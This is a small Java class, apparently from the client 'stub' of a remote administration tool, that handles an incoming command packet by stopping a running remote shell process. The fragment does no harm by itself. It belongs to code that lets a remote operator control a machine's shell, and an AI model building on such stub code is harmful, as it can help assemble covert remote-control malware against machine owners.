package com.redpois0n.stub.packets.incoming;

import com.redpois0n.RemoteShell;

public class Packet24RemoteShellStop extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		RemoteShell.p.destroy();
	}

}
